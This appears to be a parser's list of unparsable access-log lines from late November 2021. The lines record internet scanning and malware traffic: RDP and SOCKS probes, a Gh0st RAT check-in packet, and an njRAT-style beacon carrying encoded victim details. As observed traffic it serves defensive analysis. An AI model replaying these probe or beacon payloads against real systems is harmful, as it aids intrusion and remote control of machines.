7@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
126@@5.188.210.227 - - [27/Nov/2021:06:35:27 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
128@@5.188.210.227 - - [27/Nov/2021:06:36:50 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
138@@178.128.194.144 - - [27/Nov/2021:07:00:46 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
163@@94.232.43.63 - - [27/Nov/2021:09:19:25 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
164@@94.232.43.63 - - [27/Nov/2021:09:19:25 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
171@@205.185.124.100 - - [27/Nov/2021:09:50:55 +0000] "" 400 0 "-" "-"@@list index out of range
269@@94.232.43.63 - - [26/Nov/2021:00:47:26 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
270@@94.232.43.63 - - [26/Nov/2021:00:47:26 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
273@@66.240.205.34 - - [26/Nov/2021:01:10:59 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
397@@20.68.10.178 - - [26/Nov/2021:05:04:50 +0000] "" 400 0 "-" "-"@@list index out of range
419@@172.104.131.24 - - [26/Nov/2021:06:46:35 +0000] "R\x93\x00\x00\xFF\xFF\xFF\xFF\x005ABC\x00" 400 166 "-" "-"@@list index out of range
